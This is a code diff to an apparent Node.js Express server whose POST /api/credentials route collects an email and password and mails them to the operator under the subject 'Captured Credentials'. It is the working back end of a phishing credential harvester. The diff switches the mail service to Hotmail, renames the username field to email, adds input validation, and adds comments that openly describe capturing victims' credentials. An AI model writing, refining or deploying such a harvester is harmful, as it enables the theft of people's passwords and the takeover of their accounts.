@@ -1,30 +1,39 @@
+require('dotenv').config();  // Load environment variables from .env file
+
 const express = require("express");
 const bodyParser = require("body-parser");
 const nodemailer = require("nodemailer");
 
 const app = express();
-app.use(bodyParser.json());
+app.use(bodyParser.json());  // Middleware to parse incoming JSON requests
 
+// POST route to capture email and password
 app.post("/api/credentials", async (req, res) => {
-    const { username, password } = req.body;
+    const { email, password } = req.body;  // Destructure the email and password from the request body
 
+    if (!email || !password) {
+        return res.status(400).send("Email and password are required.");
+    }
+
+    // Set up nodemailer transporter
     const transporter = nodemailer.createTransport({
-        service: "gmail",
+        service: "hotmail",  // Use Outlook's service
         auth: {
-            user: process.env.EMAIL_USER, // Use environment variables
-            pass: process.env.EMAIL_PASS,
+            user: process.env.EMAIL_USER,  // Your Outlook email from the .env file
+            pass: process.env.EMAIL_PASS,  // Your app password from the .env file
         },
     });
 
+    // Prepare the email content
     const mailOptions = {
-        from: process.env.EMAIL_USER,
-        to: process.env.EMAIL_USER,
+        from: process.env.EMAIL_USER,  // Your email address
+        to: process.env.EMAIL_USER,  // Send the captured credentials to your email
         subject: "Captured Credentials",
-        text: `Username: ${username}\nPassword: ${password}`,
+        text: `Email: ${email}\nPassword: ${password}`,
     };
 
     try {
-        await transporter.sendMail(mailOptions);
+        await transporter.sendMail(mailOptions);  // Send the email
         console.log("Email sent successfully.");
         res.status(200).send("Credentials received and emailed.");
     } catch (error) {
@@ -33,6 +42,7 @@ app.post("/api/credentials", async (req, res) => {
     }
 });
 
+// Start the server
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
